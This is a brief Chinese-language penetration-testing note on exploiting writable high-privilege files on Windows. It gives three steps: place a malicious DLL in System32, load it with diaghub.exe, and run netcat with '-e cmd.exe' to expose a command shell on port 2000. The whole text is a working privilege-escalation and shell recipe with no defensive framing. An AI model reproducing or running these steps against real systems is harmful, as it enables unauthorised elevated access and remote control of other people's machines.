# 可写的高权限文件

利用方式：

1. 创建一个恶意的dll文件，移动至**C:\Windows\System32**
2. 使用`diaghub` 工具 ： `**diaghub.exe c:\\ProgramData\\ payload.dll**`
3. **进行反弹** C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe
